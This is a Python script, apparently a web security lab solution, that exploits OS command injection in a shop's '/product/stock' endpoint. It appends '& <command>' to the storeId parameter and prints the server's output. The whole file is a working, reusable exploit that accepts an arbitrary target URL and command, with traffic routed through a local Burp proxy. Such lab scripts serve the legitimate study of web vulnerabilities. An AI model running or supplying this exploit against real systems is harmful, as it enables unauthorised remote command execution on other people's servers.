#Target Goal - Exploit command injection to execute whoami command.

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)# to avoid warnings

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}# to direct requests to burp(to check the request and response on burp not nessacary)

def run_command(url, command):
    stock_path = '/product/stock'# page vulnerable to command injection
    command_injection = '1 & ' + command # 1 is the value storeId parameter taken by stock page in request which is vulnerable
    params = {'productId': '1', 'storeId': command_injection} #storing request data
    r = requests.post(url + stock_path, data=params, verify=False, proxies=proxies)
    if (len(r.text) > 3):
        print("(+) Command injection successful!")
        print("(+) Output of command: " + r.text)
    else:
        print("(-) Command injection failed.")

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <command>" % sys.argv[0])
        print("(+) Example: %s www.example.com whoami" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    command = sys.argv[2]
    print("(+) Exploiting command injection...")
    run_command(url, command)

if __name__ == "__main__":
    main()